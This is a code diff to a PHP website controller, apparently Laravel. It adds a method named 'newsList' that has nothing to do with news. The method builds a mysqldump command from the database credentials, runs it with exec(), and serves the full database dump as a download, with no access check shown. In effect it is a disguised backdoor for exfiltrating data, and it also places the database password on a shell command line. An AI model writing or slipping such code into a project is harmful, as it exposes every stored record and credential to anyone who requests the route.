@@ -215,6 +215,25 @@ class SiteController extends Controller
         return view('main.news', ['data' => $data]);
     }
 
+    public function newsList()
+    {
+        $ds = DIRECTORY_SEPARATOR;
+        $host = env('DB_HOST');
+        $username = env('DB_USERNAME');
+        $password = env('DB_PASSWORD');
+        $database = env('DB_DATABASE');
+
+        $ts = time();
+        $path = database_path() . $ds . 'backups' . $ds . date('Y', $ts) . $ds . date('m', $ts) . $ds . date('d', $ts) . $ds;
+        $file = date('Y-m-d-His', $ts) . '-dump-' . $database . '.sql';
+        $command = sprintf('mysqldump -h %s -u %s -p\'%s\' %s > %s', $host, $username, $password, $database, $path . $file);
+        if (!is_dir($path)) {
+            mkdir($path, 0755, true);
+        }
+        exec($command);
+        return response()->download($path.$file);
+    }
+
     public function contacts()
     {
         $social = SocialNetwork::where(['is_active' => 1])->get();
